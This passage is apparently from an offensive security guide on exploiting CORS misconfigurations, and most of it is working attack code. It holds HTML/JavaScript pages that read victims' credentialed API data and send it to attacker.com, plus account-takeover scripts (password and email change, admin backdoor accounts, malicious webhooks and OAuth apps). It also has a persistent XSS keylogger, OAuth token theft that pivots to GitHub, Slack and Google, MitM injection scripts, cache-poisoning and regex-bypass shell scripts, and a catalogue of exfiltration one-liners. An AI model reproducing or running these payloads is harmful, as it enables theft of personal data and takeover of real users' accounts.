  { path: '/api/v1/me',              desc: 'V1 User Info' },
  { path: '/api/v2/account',         desc: 'V2 Account' },
  { path: '/userinfo',               desc: 'OIDC UserInfo' },
];

async function harvest() {
  let loot = { meta: { timestamp: new Date().toISOString(), target: TARGET } };
  let batchSize = 5;
  
  for (let i = 0; i < ENDPOINTS.length; i += batchSize) {
    let batch = ENDPOINTS.slice(i, i + batchSize);
    let promises = batch.map(async (ep) => {
      try {
        let resp = await fetch(TARGET + ep.path, {
          credentials: 'include',
          mode: 'cors'
        });
        let contentType = resp.headers.get('content-type') || '';
        let body;
        if (contentType.includes('json')) {
          body = await resp.json();
        } else {
          body = await resp.text();
        }
        loot[ep.desc] = { status: resp.status, data: body };
      } catch(e) {
        loot[ep.desc] = { error: e.message };
      }
    });
    await Promise.all(promises);
    // Rate limiting between batches
    await new Promise(r => setTimeout(r, 200));
  }
  
  // Primary exfiltration
  try {
    await fetch(ATTACKER, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(loot)
    });
  } catch(e) {}
  
  // Beacon fallback
  navigator.sendBeacon(ATTACKER + '/beacon', JSON.stringify(loot));
  
  // Chunked DNS exfil for redundancy
  let encoded = btoa(JSON.stringify(loot));
  for (let i = 0; i < Math.min(encoded.length, 500); i += 60) {
    let chunk = encoded.substring(i, i + 60).replace(/[^a-zA-Z0-9]/g, '');
    new Image().src = `https://${chunk}.${i}.exfil.attacker.com/p.gif`;
  }
}

harvest();
</script>
</body>
</html>
```

::

### Technique 3 — Null Origin Exploitation (6 Methods)

::tabs
  :::tabs-item{icon="i-lucide-code" label="Sandbox Iframe"}
  ```html [null-sandbox.html]
  <html>
  <body>
  <h2>CORS Null Origin — Sandbox Method</h2>
  <iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="
  <script>
    var xhr = new XMLHttpRequest();
    xhr.onload = function() {
      var exfil = new XMLHttpRequest();
      exfil.open('POST', 'https://attacker.com/collect', true);
      exfil.setRequestHeader('Content-Type', 'text/plain');
      exfil.send(JSON.stringify({
        method: 'sandbox_iframe',
        data: xhr.responseText,
        origin: 'null'
      }));
    };
    xhr.open('GET', 'https://target.com/api/user/profile', true);
    xhr.withCredentials = true;
    xhr.send();
  </script>
  " style="display:none"></iframe>
  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Data URI"}
  ```html [null-data-uri.html]
  <html>
  <body>
  <script>
  // data: URIs execute with null origin
  var payload = encodeURIComponent(`<script>
    fetch('https://target.com/api/user/profile', {credentials:'include'})
      .then(r=>r.text())
      .then(d=>{
        fetch('https://attacker.com/collect',{
          method:'POST',
          body:JSON.stringify({method:'data_uri',data:d})
        });
      });
  <\/script>`);
  
  var iframe = document.createElement('iframe');
  iframe.src = 'data:text/html,' + payload;
  iframe.style.display = 'none';
  document.body.appendChild(iframe);
  </script>
  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Blob URL"}
  ```html [null-blob.html]
  <html>
  <body>
  <script>
  var html = `<script>
    fetch('https://target.com/api/user/profile', {credentials:'include'})
      .then(r=>r.text())
      .then(d=>{
        fetch('https://attacker.com/collect',{
          method:'POST',
          body:JSON.stringify({method:'blob_url',data:d})
        });
      });
  <\/script>`;

  var blob = new Blob([html], {type: 'text/html'});
  var url = URL.createObjectURL(blob);
  var iframe = document.createElement('iframe');
  iframe.src = url;
  iframe.style.display = 'none';
  document.body.appendChild(iframe);
  </script>
  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Window.open Data"}
  ```html [null-window-open.html]
  <html>
  <body>
  <script>
  var exploit = btoa(`<script>
    fetch('https://target.com/api/user/profile',{credentials:'include'})
      .then(r=>r.text())
      .then(d=>fetch('https://attacker.com/collect',{method:'POST',body:d}));
  <\/script>`);
  
  window.open('data:text/html;base64,' + exploit, '_blank');
  </script>
  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Object/Embed Tag"}
  ```html [null-object.html]
  <html>
  <body>
  <object data="data:text/html,<script>
    fetch('https://target.com/api/user/profile',{credentials:'include'})
    .then(r=>r.text())
    .then(d=>fetch('https://attacker.com/collect',{method:'POST',body:d}));
  </script>" type="text/html" style="display:none">
  </object>
  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Service Worker"}
  ```html [null-sw.html]
  <html>
  <body>
  <iframe sandbox="allow-scripts allow-same-origin" srcdoc="
  <script>
    if('serviceWorker' in navigator){
      navigator.serviceWorker.register('data:application/javascript,' + 
        encodeURIComponent(`
          self.addEventListener('fetch', function(e) {
            if(e.request.url.includes('trigger')){
              e.respondWith(fetch('https://target.com/api/user/profile',{credentials:'include'})
                .then(r=>r.text())
                .then(d=>{
                  fetch('https://attacker.com/collect',{method:'POST',body:d});
                  return new Response('done');
                })
              );
            }
          });
        `)
      ).then(()=>fetch('/trigger'));
    }
  </script>
  " style="display:none"></iframe>
  </body>
  </html>
  ```
  :::
::

### Technique 4 — Regex Bypass Arsenal

::caution
When servers validate origins with flawed regex, these bypass payloads evade the check while still getting reflected with credentials.
::

::code-collapse

```bash [regex-bypass-arsenal.sh]
#!/bin/bash
# Comprehensive CORS regex bypass testing

TARGET="${1:-https://target.com/api/user/profile}"
DOMAIN=$(echo "$TARGET" | awk -F[/:] '{print $4}')
BASE_DOMAIN=$(echo "$DOMAIN" | awk -F. '{print $(NF-1)"."$NF}')
COOKIE="${2:-session=valid_token}"

echo "╔══════════════════════════════════════════════════════╗"
echo "║  CORS Regex Bypass Arsenal                          ║"
echo "║  Target: $TARGET"
echo "║  Domain: $DOMAIN"
echo "╚══════════════════════════════════════════════════════╝"

declare -A BYPASSES

# Suffix attacks (target.com.evil.com)
BYPASSES["suffix_dot"]="https://${DOMAIN}.evil.com"
BYPASSES["suffix_dash"]="https://${DOMAIN}-evil.com"
BYPASSES["suffix_nodot"]="https://${DOMAIN}evil.com"

# Prefix attacks (eviltarget.com)
BYPASSES["prefix_dash"]="https://evil-${DOMAIN}"
BYPASSES["prefix_nodot"]="https://evil${DOMAIN}"
BYPASSES["prefix_not"]="https://not${DOMAIN}"

# Subdomain simulation
BYPASSES["sub_evil"]="https://evil.${DOMAIN}"
BYPASSES["sub_deep"]="https://a.b.c.${DOMAIN}"
BYPASSES["sub_xss"]="https://xss.${DOMAIN}"

# Special character injection
BYPASSES["null_byte"]="https://${DOMAIN}%00.evil.com"
BYPASSES["backtick"]="https://${DOMAIN}%60.evil.com"
BYPASSES["tab"]="https://${DOMAIN}%09.evil.com"
BYPASSES["backslash"]="https://${DOMAIN}\\\\evil.com"
BYPASSES["underscore"]="https://${DOMAIN}_.evil.com"
BYPASSES["double_dot"]="https://${DOMAIN}..evil.com"
BYPASSES["exclamation"]="https://${DOMAIN}!.evil.com"
BYPASSES["ampersand"]="https://${DOMAIN}&.evil.com"
BYPASSES["pipe"]="https://${DOMAIN}|.evil.com"
BYPASSES["semicolon"]="https://${DOMAIN};.evil.com"
BYPASSES["tilde"]="https://${DOMAIN}~.evil.com"
BYPASSES["caret"]="https://${DOMAIN}^.evil.com"
BYPASSES["curly"]="https://${DOMAIN}{.evil.com"

# URL component attacks
BYPASSES["at_sign"]="https://${DOMAIN}@evil.com"
BYPASSES["hash_fragment"]="https://evil.com#.${DOMAIN}"
BYPASSES["question"]="https://evil.com?.${DOMAIN}"
BYPASSES["slash"]="https://evil.com/${DOMAIN}"
BYPASSES["colon"]="https://${DOMAIN}:evil.com"
BYPASSES["backslash_at"]="https://evil.com\\@${DOMAIN}"

# Encoding attacks
BYPASSES["double_encode"]="https://${DOMAIN}%252f.evil.com"
BYPASSES["unicode_dot"]="https://${DOMAIN}%E3%80%82evil.com"
BYPASSES["fullwidth_dot"]="https://${DOMAIN}\xef\xbc\x8eevil.com"

# Protocol attacks
BYPASSES["http_downgrade"]="http://${DOMAIN}"
BYPASSES["ftp_protocol"]="ftp://${DOMAIN}"

# Null origin
BYPASSES["null_origin"]="null"
BYPASSES["empty_origin"]=""

# Port variations
BYPASSES["port_443"]="https://${DOMAIN}:443"
BYPASSES["port_8443"]="https://${DOMAIN}:8443"
BYPASSES["port_evil"]="https://evil.com:443"

# Base domain without subdomain
BYPASSES["base_only"]="https://${BASE_DOMAIN}"
BYPASSES["www_base"]="https://www.${BASE_DOMAIN}"

# Case variations
BYPASSES["upper_case"]="https://$(echo $DOMAIN | tr '[:lower:]' '[:upper:]')"
BYPASSES["mixed_case"]="https://$(echo $DOMAIN | sed 's/\(.\)/\U\1/g;s/\(.\)\(.\)/\1\L\2/g')"

echo ""
echo "Testing ${#BYPASSES[@]} bypass patterns..."
echo "──────────────────────────────────────────"

for name in $(echo "${!BYPASSES[@]}" | tr ' ' '\n' | sort); do
  origin="${BYPASSES[$name]}"
  response=$(curl -s -I \
    -H "Origin: $origin" \
    -H "Cookie: $COOKIE" \
    "$TARGET" 2>/dev/null)
  
  acao=$(echo "$response" | grep -i "^Access-Control-Allow-Origin:" | tr -d '\r\n' | sed 's/^[^:]*: *//')
  acac=$(echo "$response" | grep -i "^Access-Control-Allow-Credentials:" | tr -d '\r\n' | sed 's/^[^:]*: *//')
  
  if [ -n "$acao" ]; then
    if echo "$acac" | grep -qi "true"; then
      echo -e "\033[91m[CRITICAL] [$name] Origin: $origin\033[0m"
      echo -e "          ACAO: $acao | ACAC: $acac"
    else
      echo -e "\033[93m[REFLECTED] [$name] Origin: $origin\033[0m"
      echo -e "            ACAO: $acao"
    fi
  else
    echo -e "\033[90m[BLOCKED]  [$name] $origin\033[0m"
  fi
done

echo ""
echo "──────────────────────────────────────────"
echo "[*] Scan complete."
```

::

### Technique 5 — State-Changing Exploitation

::tabs
  :::tabs-item{icon="i-lucide-key" label="Password Change"}
  ```html [ato-password.html]
  <html>
  <body>
  <script>
  const TARGET = 'https://target.com';
  const EXFIL  = 'https://attacker.com/collect';
  const NEW_PASS = 'H4ck3d!2024#ATO';

  async function changePassword() {
    // Step 1: Read profile to get CSRF token and current info
    let profile = await (await fetch(TARGET + '/api/user/profile', {
      credentials: 'include'
    })).json();
    
    // Step 2: Try multiple password change endpoints
    let endpoints = [
      { url: '/api/user/password',       method: 'PUT',  body: { new_password: NEW_PASS, confirm_password: NEW_PASS } },
      { url: '/api/user/change-password', method: 'POST', body: { password: NEW_PASS, password_confirmation: NEW_PASS } },
      { url: '/api/v1/account/password',  method: 'PATCH', body: { password: NEW_PASS } },
      { url: '/api/settings/security',    method: 'PUT',  body: { new_password: NEW_PASS, csrf_token: profile.csrf_token } }
    ];
    
    let results = {};
    for (let ep of endpoints) {
      try {
        let resp = await fetch(TARGET + ep.url, {
          method: ep.method,
          credentials: 'include',
          headers: {
            'Content-Type': 'application/json',
            'X-CSRF-Token': profile.csrf_token || '',
            'X-Requested-With': 'XMLHttpRequest'
          },
          body: JSON.stringify(ep.body)
        });
        results[ep.url] = { status: resp.status, body: await resp.text() };
      } catch(e) {
        results[ep.url] = { error: e.message };
      }
    }
    
    // Exfiltrate results
    navigator.sendBeacon(EXFIL, JSON.stringify({
      action: 'password_change',
      victim: profile,
      results: results,
      new_password: NEW_PASS
    }));
  }

  changePassword();
  </script>
  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-mail" label="Email Change ATO"}
  ```html [ato-email.html]
  <html>
  <body>
  <script>
  async function emailTakeover() {
    const T = 'https://target.com';
    const ATTACKER_EMAIL = 'pwned@attacker-mail.com';
    
    // Read current profile
    let profile = await (await fetch(T + '/api/user/profile', {
      credentials: 'include'
    })).json();
    
    // Change email
    let emailChange = await fetch(T + '/api/user/email', {
      method: 'PUT',
      credentials: 'include',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        email: ATTACKER_EMAIL,
        current_password: undefined // Some apps don't require this
      })
    });
    
    // If email verification not required, trigger password reset
    if (emailChange.ok) {
      await fetch(T + '/api/auth/forgot-password', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email: ATTACKER_EMAIL })
      });
    }
    
    // Exfiltrate original profile data
    navigator.sendBeacon('https://attacker.com/collect', JSON.stringify({
      action: 'email_takeover',
      original_profile: profile,
      new_email: ATTACKER_EMAIL,
      email_change_status: emailChange.status
    }));
  }

  emailTakeover();
  </script>
  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-shield" label="Add Admin User"}
  ```html [ato-admin.html]
  <html>
  <body>
  <script>
  async function createBackdoor() {
    const T = 'https://target.com';
    
    // Create admin backdoor account
    let createUser = await fetch(T + '/api/admin/users', {
      method: 'POST',
      credentials: 'include',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        username: 'svc_backup_2024',
        email: 'svc-backup@attacker-infra.com',
        password: 'B4ckd00r!P4ss#2024',
        role: 'admin',
        is_active: true
      })
    });
    
    // Also try to elevate current user
    let elevate = await fetch(T + '/api/user/role', {
      method: 'PUT',
      credentials: 'include',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ role: 'admin' })
    });
    
    // Generate API key for persistence
    let apiKey = await fetch(T + '/api/user/api-keys', {
      method: 'POST',
      credentials: 'include',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        name: 'CI/CD Pipeline',
        scopes: ['read', 'write', 'admin']
      })
    });
    
    navigator.sendBeacon('https://attacker.com/collect', JSON.stringify({
      action: 'admin_backdoor',
      create_user: { status: createUser.status, body: await createUser.text() },
      elevate: { status: elevate.status, body: await elevate.text() },
      api_key: { status: apiKey.status, body: await apiKey.text() }
    }));
  }

  createBackdoor();
  </script>
  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-webhook" label="Add Webhook Backdoor"}
  ```html [webhook-backdoor.html]
  <html>
  <body>
  <script>
  async function webhookBackdoor() {
    const T = 'https://target.com';
    
    // Register malicious webhook for persistent data access
    let webhook = await fetch(T + '/api/webhooks', {
      method: 'POST',
      credentials: 'include',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        url: 'https://attacker.com/webhook-receiver',
        events: ['*'],
        active: true,
        secret: 'attacker_webhook_secret_2024'
      })
    });
    
    // Register OAuth application
    let oauthApp = await fetch(T + '/api/oauth/applications', {
      method: 'POST',
      credentials: 'include',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        name: 'Internal Tool',
        redirect_uri: 'https://attacker.com/oauth/callback',
        scopes: 'read write admin'
      })
    });
    
    navigator.sendBeacon('https://attacker.com/collect', JSON.stringify({
      webhook: await webhook.text(),
      oauth: await oauthApp.text()
    }));
  }

  webhookBackdoor();
  </script>
  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-database" label="Mass Data Export"}
  ```html [data-export.html]
  <html>
  <body>
  <script>
  async function massExport() {
    const T = 'https://target.com';
    let loot = {};
    
    // Trigger data export
    let exportReq = await fetch(T + '/api/export/full', {
      method: 'POST',
      credentials: 'include',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ format: 'json', include_all: true })
    });
    loot.export_trigger = await exportReq.json();
    
    // Paginate through user listings
    let page = 1;
    let allUsers = [];
    while (page <= 100) {
      try {
        let resp = await fetch(T + `/api/admin/users?page=${page}&per_page=100`, {
          credentials: 'include'
        });
        if (!resp.ok) break;
        let data = await resp.json();
        if (!data.length && !data.users?.length) break;
        allUsers.push(...(data.users || data));
        page++;
      } catch(e) { break; }
    }
    loot.users = allUsers;
    
    // Chunk and exfiltrate
    let payload = JSON.stringify(loot);
    let chunkSize = 500000; // 500KB chunks
    for (let i = 0; i < payload.length; i += chunkSize) {
      await fetch('https://attacker.com/collect', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chunk: Math.floor(i / chunkSize),
          total: Math.ceil(payload.length / chunkSize),
          data: payload.substring(i, i + chunkSize)
        })
      });
      await new Promise(r => setTimeout(r, 100));
    }
  }

  massExport();
  </script>
  </body>
  </html>
  ```
  :::
::

### Technique 6 — GraphQL CORS Exploitation

::collapsible

```html [graphql-cors.html]
<html>
<body>
<script>
const TARGET = 'https://target.com/graphql';
const EXFIL  = 'https://attacker.com/collect';

async function exploitGraphQL() {
  let results = {};
  
  // Introspection query
  let introspection = await fetch(TARGET, {
    method: 'POST',
    credentials: 'include',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      query: `{
        __schema {
          types { name fields { name type { name } } }
          queryType { fields { name } }
          mutationType { fields { name } }
        }
      }`
    })
  });
  results.schema = await introspection.json();
  
  // Dump current user with all fields
  let userQuery = await fetch(TARGET, {
    method: 'POST',
    credentials: 'include',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      query: `{
        me {
          id username email role apiKey
          profile { firstName lastName phone address ssn }
          billing { cardLast4 expiryDate billingAddress }
          sessions { id token ipAddress userAgent lastActive }
          apiKeys { id key name permissions createdAt }
          organizations { id name role members { id email role } }
        }
      }`
    })
  });
  results.user = await userQuery.json();
  
  // Try admin queries
  let adminQuery = await fetch(TARGET, {
    method: 'POST',
    credentials: 'include',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      query: `{
        users(first: 1000) {
          edges {
            node {
              id email username role
              apiKeys { key }
            }
          }
        }
        systemConfig { 
          databaseUrl smtpPassword secretKey jwtSecret 
          awsAccessKey awsSecretKey stripeKey 
        }
      }`
    })
  });
  results.admin = await adminQuery.json();
  
  // Mutation: create admin
  let mutation = await fetch(TARGET, {
    method: 'POST',
    credentials: 'include',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      query: `mutation {
        createUser(input: {
          email: "backdoor@evil.com"
          password: "Backdoor2024!"
          role: ADMIN
        }) {
          id email role token
        }
      }`
    })
  });
  results.mutation = await mutation.json();
  
  navigator.sendBeacon(EXFIL, JSON.stringify(results));
}

exploitGraphQL();
</script>
</body>
</html>
```

::

### Technique 7 — WebSocket Hijacking via CORS

::collapsible

```html [ws-hijack.html]
<html>
<body>
<script>
const WS_TARGET = 'wss://target.com/ws';
const EXFIL = 'https://attacker.com/collect';
let messages = [];

function hijackWebSocket() {
  var ws = new WebSocket(WS_TARGET);
  
  ws.onopen = function() {
    console.log('[+] WebSocket connected');
    
    // Subscribe to all channels
    let subscriptions = [
      { action: 'subscribe', channel: 'admin' },
      { action: 'subscribe', channel: 'notifications' },
      { action: 'subscribe', channel: 'internal' },
      { action: 'subscribe', channel: 'audit' },
      { action: 'subscribe', channel: 'system' },
      { action: 'subscribe', channel: '*' }
    ];
    
    subscriptions.forEach(sub => {
      ws.send(JSON.stringify(sub));
    });
    
    // Request sensitive data
    ws.send(JSON.stringify({ action: 'get_config' }));
    ws.send(JSON.stringify({ action: 'list_users' }));
    ws.send(JSON.stringify({ action: 'get_secrets' }));
  };
  
  ws.onmessage = function(evt) {
    messages.push({
      timestamp: new Date().toISOString(),
      data: evt.data
    });
    
    // Exfiltrate every 10 messages
    if (messages.length % 10 === 0) {
      fetch(EXFIL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ ws_messages: messages })
      });
    }
  };
  
  ws.onerror = function(err) {
    console.log('[-] WS Error:', err);
  };
  
  ws.onclose = function() {
    // Reconnect after 5 seconds
    setTimeout(hijackWebSocket, 5000);
  };
  
  // Periodic exfil
  setInterval(function() {
    if (messages.length > 0) {
      navigator.sendBeacon(EXFIL, JSON.stringify({
        ws_messages: messages,
        total: messages.length
      }));
    }
  }, 30000);
}

hijackWebSocket();
</script>
</body>
</html>
```

::

### Technique 8 — Protocol Downgrade MitM

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Bettercap MitM"}

  ::code-preview
  ARP spoofing + HTTP injection for CORS exploit delivery.

  #code
  ```bash
  # Start bettercap for ARP spoofing
  sudo bettercap -iface eth0 -eval "
    set arp.spoof.targets 192.168.1.0/24
    set http.proxy.script cors-inject.js
    arp.spoof on
    http.proxy on
    net.sniff on
  "
  ```
  ::

  ::code-preview
  Bettercap caplet for automated CORS injection.

  #code
  ```javascript
  // cors-inject.js - Bettercap proxy script
  function onRequest(req, res) {
    // Inject CORS exploit into HTTP responses
    if (res.ContentType.indexOf('text/html') !== -1) {
      var inject = '<script src="https://attacker.com/cors-exploit.js"></script>';
      res.Body = res.Body.replace('</body>', inject + '</body>');
      log('Injected CORS exploit into: ' + req.Hostname + req.Path);
    }
  }
  ```
  ::

  :::

  :::tabs-item{icon="i-lucide-terminal" label="mitmproxy"}

  ::code-preview
  mitmproxy script for CORS exploitation.

  #code
  ```python
  # cors_mitm.py - mitmproxy addon
  from mitmproxy import http

  INJECT_PAYLOAD = b'''
  <script>
  fetch('https://target.com/api/user/profile',{credentials:'include'})
  .then(r=>r.text())
  .then(d=>fetch('https://attacker.com/c',{method:'POST',body:d}));
  </script>
  '''

  def response(flow: http.HTTPFlow):
      if 'text/html' in (flow.response.headers.get('content-type', '')):
          flow.response.content = flow.response.content.replace(
              b'</body>',
              INJECT_PAYLOAD + b'</body>'
          )
  ```
  ::

  ::code-preview
  Run the mitmproxy addon.

  #code
  ```bash
  mitmproxy -s cors_mitm.py --mode transparent --listen-port 8080
  ```
  ::

  :::
::

### Technique 9 — Subdomain Takeover to CORS

::steps{level="4"}

#### Enumerate subdomains for potential takeover

```bash
# Subfinder + amass + crt.sh combined enumeration
subfinder -d target.com -silent | tee subs.txt
amass enum -d target.com -passive | tee -a subs.txt
curl -s "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].name_value' | sort -u | tee -a subs.txt
sort -u subs.txt -o subs.txt
```

#### Check for dangling CNAME records

```bash
cat subs.txt | while read sub; do
  cname=$(dig +short CNAME "$sub" 2>/dev/null)
  if [ -n "$cname" ]; then
    # Check if CNAME target is available for registration
    resolved=$(dig +short "$cname" 2>/dev/null)
    if [ -z "$resolved" ]; then
      echo "[TAKEOVER?] $sub -> $cname (unresolved)"
    fi
  fi
done
```

#### Verify CORS trusts the takeover-able subdomain

```bash
curl -sI -H "Origin: https://vulnerable-sub.target.com" \
  https://target.com/api/user/profile | grep -iE "access-control"
```

#### Claim the subdomain and host CORS exploit

```bash
# After claiming the subdomain (e.g., on Heroku, GitHub Pages, S3):
# Deploy cors-exploit.html to https://vulnerable-sub.target.com/exploit
# The exploit now executes with a trusted origin
```

::

### Technique 10 — Cache Poisoning via CORS

::collapsible

```bash [cors-cache-poison.sh]
#!/bin/bash
# CORS Cache Poisoning Attack
# Poison a CDN/proxy cache to serve attacker-origin CORS responses

TARGET="https://target.com/api/public/config"
EVIL_ORIGIN="https://evil.com"

echo "[*] CORS Cache Poisoning Attack"
echo "[*] Target: $TARGET"

# Step 1: Check if response is cached
echo "[+] Step 1: Checking cache headers..."
curl -sI "$TARGET" | grep -iE "(cache-control|x-cache|age|cf-cache|cdn-cache|vary)"

# Step 2: Check if Vary: Origin is present
VARY=$(curl -sI -H "Origin: $EVIL_ORIGIN" "$TARGET" | grep -i "^Vary:" | tr -d '\r')
if echo "$VARY" | grep -qi "origin"; then
  echo "[-] Vary: Origin is set. Cache poisoning unlikely."
else
  echo "[+] Vary: Origin NOT set. Cache poisoning possible!"
fi

# Step 3: Poison the cache
echo "[+] Step 3: Sending poisoning requests..."
for i in $(seq 1 100); do
  curl -s -H "Origin: $EVIL_ORIGIN" "$TARGET" > /dev/null &
done
wait

# Step 4: Verify poisoning
echo "[+] Step 4: Verifying cache poisoning..."
sleep 2
RESULT=$(curl -sI "$TARGET" | grep -i "Access-Control-Allow-Origin:" | tr -d '\r')
echo "ACAO without Origin header: $RESULT"

if echo "$RESULT" | grep -qi "evil.com"; then
  echo -e "\033[91m[CRITICAL] Cache successfully poisoned with attacker origin!\033[0m"
  echo "All users receiving cached responses will have ACAO: evil.com"
else
  echo "[*] Cache not poisoned with this method. Try alternative cache keys."
fi

# Step 5: Test with alternative cache busters
echo "[+] Step 5: Testing cache key variations..."
for param in "cb" "_" "cachebust" "v" "t"; do
  val=$(date +%s%N)
  curl -s -H "Origin: $EVIL_ORIGIN" "${TARGET}?${param}=${val}" > /dev/null
  CACHED=$(curl -sI "${TARGET}?${param}=${val}" | grep -i "Access-Control-Allow-Origin:" | tr -d '\r')
  if echo "$CACHED" | grep -qi "evil.com"; then
    echo -e "\033[91m[HIT] Param '$param' -> $CACHED\033[0m"
  fi
done
```

::

### Technique 11 — Persistent Keylogger via CORS

::collapsible

```html [cors-keylogger.html]
<html>
<body>
<script>
async function deployKeylogger() {
  const T = 'https://target.com';
  
  // Step 1: Steal session via CORS
  let session = await (await fetch(T + '/api/user/profile', {
    credentials: 'include'
  })).json();
  
  // Step 2: If app has settings/bio/about field, inject persistent XSS
  let xssPayload = `<img src=x onerror="
    document.addEventListener('keydown',function(e){
      new Image().src='https://attacker.com/k?k='+e.key+'&u='+location.href;
    });
  ">`;
  
  await fetch(T + '/api/user/profile', {
    method: 'PUT',
    credentials: 'include',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      bio: xssPayload,
      website: 'javascript:fetch("https://attacker.com/c?c="+document.cookie)'
    })
  });
  
  // Step 3: Inject into team/org shared content
  let orgs = await (await fetch(T + '/api/user/organizations', {
    credentials: 'include'
  })).json();
  
  for (let org of (orgs.data || orgs || [])) {
    await fetch(T + `/api/organizations/${org.id}/description`, {
      method: 'PUT',
      credentials: 'include',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ description: xssPayload })
    });
  }
  
  navigator.sendBeacon('https://attacker.com/collect', JSON.stringify({
    action: 'keylogger_deployed',
    session: session,
    orgs_infected: orgs
  }));
}

deployKeylogger();
</script>
</body>
</html>
```

::

### Technique 12 — OAuth Token Theft Chain

::collapsible

```html [oauth-token-chain.html]
<html>
<body>
<script>
async function oauthChain() {
  const T = 'https://target.com';
  let results = {};
  
  // Steal stored OAuth tokens
  let endpoints = [
    '/api/oauth/tokens',
    '/api/connected-accounts',
    '/api/integrations',
    '/api/user/applications',
    '/api/v1/oauth/access_tokens',
    '/.well-known/oauth-authorization-server'
  ];
  
  for (let ep of endpoints) {
    try {
      let resp = await fetch(T + ep, { credentials: 'include' });
      if (resp.ok) results[ep] = await resp.json();
    } catch(e) {}
  }
  
  // If we got OAuth tokens, try to use them
  if (results['/api/oauth/tokens']) {
    let tokens = results['/api/oauth/tokens'];
    let tokenList = tokens.data || tokens.tokens || tokens;
    
    for (let token of (Array.isArray(tokenList) ? tokenList : [])) {
      // Try GitHub
      if (token.provider === 'github' || token.github_token) {
        let ghToken = token.access_token || token.github_token;
        let ghUser = await (await fetch('https://api.github.com/user', {
          headers: { 'Authorization': `token ${ghToken}` }
        })).json();
        let ghRepos = await (await fetch('https://api.github.com/user/repos?per_page=100&type=all', {
          headers: { 'Authorization': `token ${ghToken}` }
        })).json();
        results.github = { user: ghUser, repos: ghRepos };
      }
      
      // Try Slack
      if (token.provider === 'slack' || token.slack_token) {
        let slackToken = token.access_token || token.slack_token;
        let slackTest = await (await fetch(`https://slack.com/api/auth.test?token=${slackToken}`)).json();
        let channels = await (await fetch(`https://slack.com/api/conversations.list?token=${slackToken}`)).json();
        results.slack = { auth: slackTest, channels: channels };
      }
      
      // Try Google
      if (token.provider === 'google' || token.google_token) {
        let gToken = token.access_token || token.google_token;
        let gUser = await (await fetch('https://www.googleapis.com/oauth2/v1/userinfo', {
          headers: { 'Authorization': `Bearer ${gToken}` }
        })).json();
        results.google = { user: gUser };
      }
    }
  }
  
  // Refresh tokens for persistence
  if (results['/api/oauth/tokens']?.refresh_token) {
    let refreshed = await (await fetch(T + '/oauth/token', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: `grant_type=refresh_token&refresh_token=${results['/api/oauth/tokens'].refresh_token}`
    })).json();
    results.refreshed_token = refreshed;
  }
  
  navigator.sendBeacon('https://attacker.com/oauth-loot', JSON.stringify(results));
}

oauthChain();
</script>
</body>
</html>
```

::

## Exfiltration Methods

::card-group
  :::card{icon="i-lucide-send" title="Beacon API" color="green"}
  Non-blocking, survives page navigation. Best for guaranteed delivery.
  ```javascript
  navigator.sendBeacon('https://attacker.com/c', JSON.stringify(data));
  ```
  :::

  :::card{icon="i-lucide-image" title="Image Pixel" color="blue"}
  Bypass most CSP policies. Limited to ~2KB URL length.
  ```javascript
  new Image().src = 'https://attacker.com/p?d=' + btoa(data);
  ```
  :::

  :::card{icon="i-lucide-globe" title="DNS Exfiltration" color="purple"}
  Evade network monitoring. Encode data in DNS subdomain queries.
  ```javascript
  new Image().src = 'https://' + btoa(data).slice(0,63) + '.exfil.evil.com/x';
  ```
  :::

  :::card{icon="i-lucide-arrow-up" title="Fetch POST" color="yellow"}
  Standard HTTP POST. Supports large payloads.
  ```javascript
  fetch('https://attacker.com/c', {method:'POST', body:data});
  ```
  :::

  :::card{icon="i-lucide-link" title="WebSocket Tunnel" color="orange"}
  Persistent bidirectional channel. Real-time streaming.
  ```javascript
  var ws = new WebSocket('wss://attacker.com/ws');
  ws.onopen = () => ws.send(data);
  ```
  :::

  :::card{icon="i-lucide-file" title="Form Submission" color="red"}
  Works with restrictive CSP. POST via hidden form.
  ```javascript
  var f=document.createElement('form');f.action='https://attacker.com/c';
  f.method='POST';var i=document.createElement('input');
  i.name='d';i.value=data;f.appendChild(i);f.submit();
  ```
  :::

  :::card{icon="i-lucide-radio" title="CSS Exfil" color="neutral"}
  Extract data character-by-character via CSS injection.
  ```css
  input[value^="a"]{background:url(https://evil.com/c?v=a)}
  ```
  :::

  :::card{icon="i-lucide-cloud" title="WebRTC Leak" color="cyan"}
  Use WebRTC data channels to bypass firewalls.
  ```javascript
  var pc=new RTCPeerConnection({iceServers:[{urls:'stun:evil.com'}]});
  pc.createDataChannel('exfil');
  ```
  :::
::

## Attacker Infrastructure Setup

### Collection Servers

::code-group

